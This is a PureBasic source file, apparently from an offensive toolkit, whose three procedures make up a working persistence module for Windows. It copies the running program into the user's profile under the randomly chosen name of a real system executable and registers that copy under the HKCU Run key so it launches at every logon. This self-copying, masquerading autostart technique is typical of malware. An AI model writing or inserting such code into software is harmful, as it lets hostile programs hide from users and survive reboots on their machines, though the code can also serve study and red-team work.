; ***************************************************************************
; *                                                                         *
; * Author:      marpie (marpie+toolkit@a12d404.net)                        *
; * License:     BSD License                                                *
; * Copyright:   (c) 2012, a12d404.net                                      *
; * Status:      Prototype                                                  *
; *                                                                         *
; ***************************************************************************
EnableExplicit

XIncludeFile("filesystem/registry.pbi")

; ---------------------------------------------------------------------------
;- Consts


; ---------------------------------------------------------------------------
;- Types


; ---------------------------------------------------------------------------
;- Prototypes
Declare.s GetAnySystemFilename(targetExtension.s = "exe")
Declare.s InstallToProfile(useSystemFilename.b = #True)
Declare.b InstallUserAutorun(filePath.s, keyName.s = "")


; ---------------------------------------------------------------------------
;- Variables


; ---------------------------------------------------------------------------
;- Procedures

; ***************************************************************************
; * GetAnySystemFilename -- Parses the system directory and returns a       *
; *                          random filename.                               *
; * Author:      marpie (marpie+toolkit@a12d404.net)                        *
; ***************************************************************************
Procedure.s GetAnySystemFilename(targetExtension.s = "exe")
  Define res.s
  Define hDir.i
  NewList sysFilenames.s()
  
  ; %WINDIR%
  hDir = ExamineDirectory(#PB_Any, GetEnvironmentVariable("windir"), "*." + targetExtension)
  If Not hDir
    Goto GetAnySystemFilenameError
  EndIf
  
  While NextDirectoryEntry(hDir)
    If DirectoryEntryType(hDir) = #PB_DirectoryEntry_File
      AddElement(sysFilenames())
      sysFilenames() = DirectoryEntryName(hDir)
    EndIf
  Wend
  FinishDirectory(hDir)
  
  ; %WINDIR%\system32
  hDir = ExamineDirectory(#PB_Any, GetEnvironmentVariable("windir") + "\System32\", "*." + targetExtension)
  If Not hDir
    Goto GetAnySystemFilenameError
  EndIf
  
  While NextDirectoryEntry(hDir)
    If DirectoryEntryType(hDir) = #PB_DirectoryEntry_File
      AddElement(sysFilenames())
      sysFilenames() = DirectoryEntryName(hDir)
    EndIf
  Wend
  FinishDirectory(hDir)
  hDir = #Null
  
  ; randomly select any element
  SelectElement(sysFilenames(), Random(ListSize(sysFilenames())-1))
  res = sysFilenames()
  
GetAnySystemFilenameCleanup:
  If hDir
    FinishDirectory(hDir)
  EndIf
  
  ProcedureReturn res
GetAnySystemFilenameError:
  res = ""
  Goto GetAnySystemFilenameCleanup
EndProcedure

; ***************************************************************************
; * InstallToProfile -- Copies the current program into the profile dir of  *
; *                     the user and returns the new filename.              *
; * Author:      marpie (marpie+toolkit@a12d404.net)                        *
; ***************************************************************************
Procedure.s InstallToProfile(useSystemFilename.b = #True)
  Define res.s
  
  If useSystemFilename
    res = GetAnySystemFilename()
  Else
    res = ProgramFilename()
  EndIf
  
  res = GetHomeDirectory() + "\" + res
  If Not CopyFile(ProgramFilename(), res)
    Goto InstallToProfileError
  EndIf
  
InstallToProfileCleanup:
  ProcedureReturn res
  
InstallToProfileError:
  res = ""
  Goto InstallToProfileCleanup
EndProcedure

; ***************************************************************************
; * InstallUserAutorun -- Adds the filename to HKCU\...\Run                 *
; * Author:      marpie (marpie+toolkit@a12d404.net)                        *
; ***************************************************************************
Procedure.b InstallUserAutorun(filePath.s, keyName.s = "")
  If keyName = ""
    keyName = GetFilePart(filePath)
    keyName = Left(keyName, Len(keyName) - Len(GetExtensionPart(keyName)) - 1)
  EndIf
  
  ProcedureReturn RegistryWriteString(#HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", keyName, filePath)
EndProcedure

; ***************************************************************************
; * Sample -- Does nothing ... really!                                      *
; * Author:      marpie (marpie+toolkit@a12d404.net)                        *
; ***************************************************************************
;Procedure.b Sample(param.l)
;   Define res.b
;   
; SampleCleanup:
;   
;   
;   ProcedureReturn res
; SampleError:
;   res = #False
;   Goto SampleCleanup
;EndProcedure

; ---------------------------------------------------------------------------

; IDE Options = PureBasic 4.50 RC 1 (Windows - x64)
; CursorPosition = 26
; FirstLine = 9
; Folding = 5
; EnableXP
; EnablePurifier
; EnableCompileCount = 0
; EnableBuildCount = 0
; EnableExeConstant